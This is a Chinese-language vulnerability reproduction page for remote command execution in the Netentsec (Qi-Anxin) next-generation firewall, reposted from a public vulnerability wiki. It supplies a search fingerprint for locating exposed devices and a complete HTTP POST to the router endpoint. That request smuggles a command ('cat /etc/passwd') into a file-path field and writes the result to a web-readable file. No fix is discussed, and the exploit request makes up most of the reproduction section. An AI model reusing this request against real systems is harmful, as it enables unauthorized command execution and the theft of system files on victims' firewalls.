---
title: "网康 下一代防火墙 router 远程命令执行漏洞"
date: 2026-10-18 09:16:40
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "网康"
tags:
  - "网康"
  - "命令执行"
  - "代码执行"
  - "漏洞复现"
---
## 漏洞描述

奇安信 网康下一代防火墙存在远程命令执行，通过漏洞攻击者可以获取服务器权限

## 漏洞影响

```
奇安信 网康下一代防火墙
```

## 网络测绘

```
app="网康科技-下一代防火墙"
```

## 漏洞复现

登录页面如下

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202162229920.png)

发送如下请求包

```plain
![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/C:/Users/47236/Desktop/2.png)POST /directdata/direct/router HTTP/1.1
Host: XXX.XXX.XXX.XXX
Connection: close
Content-Length: 179
Cache-Control: max-age=0
sec-ch-ua: "Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"
sec-ch-ua-mobile: ?0
Content-Type: application/json
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

{"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;cat /etc/passwd >/var/www/html/test_cmd.txt"]}],"type":"rpc","tid":17,"f8839p7rqtj":"="}
```

再请求获取命令执行结果

```plain
http://xxx.xxx.xxx.xxxx/test_cmd.txt
```

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202162229568.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/%E7%BD%91%E5%BA%B7-%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-router-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md)
